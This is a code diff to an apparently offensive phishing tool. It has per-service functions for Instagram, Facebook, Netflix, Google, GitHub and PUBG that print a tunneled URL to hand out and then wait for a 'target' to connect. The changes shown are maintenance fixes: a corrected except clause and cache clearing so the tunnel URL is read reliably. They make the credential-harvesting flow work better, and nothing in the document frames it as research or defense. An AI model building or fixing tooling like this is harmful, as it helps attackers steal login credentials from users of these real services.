@@ -12,7 +12,7 @@ if os.name == "nt":
         import win32gui, win32con
         import pandas as pd
         
-    except ImportError or ModuleNotFoundError:
+    except (ImportError , ModuleNotFoundError):
         install = input("unfortunately you dont have excepetd modules !!\nWant to install ? (y/n) : ")
         if install == "y":
             os.system("pip install -r requirements.txt")
@@ -27,7 +27,7 @@ else:
         from colorama import Fore , init; init()
         import pandas as pd
         
-    except ImportError or ModuleNotFoundError:
+    except (ImportError , ModuleNotFoundError):
         install = input("unfortunately you dont have excepetd modules !!\nWant to install ? (y/n) : ")
         if install == "y":
             os.system("pip install -r requirements_linux.txt")
@@ -133,6 +133,8 @@ def instagram():
 
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+    sleep(0.1)
+    linecache.clearcache()
     print("")
     Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n" + Fore.RESET)
 
@@ -235,9 +237,9 @@ def facebook():
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
-
+    sleep(0.1)
+    linecache.clearcache()
     print("")
-
     Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
@@ -338,9 +340,9 @@ def netflix():
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
-
+    sleep(0.1)
+    linecache.clearcache()
     print("")
-
     Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
@@ -441,9 +443,9 @@ def Google():
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
-
+    sleep(0.1)
+    linecache.clearcache()
     print("")
-
     Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
@@ -546,9 +548,9 @@ def Github():
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
-
+    sleep(0.1)
+    linecache.clearcache()
     print("")
-
     Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
@@ -651,7 +653,9 @@ def Pubg():
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
-
+    sleep(0.1)
+    linecache.clearcache()
+    print("")
     Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
         
 #Write info====================================================================================================
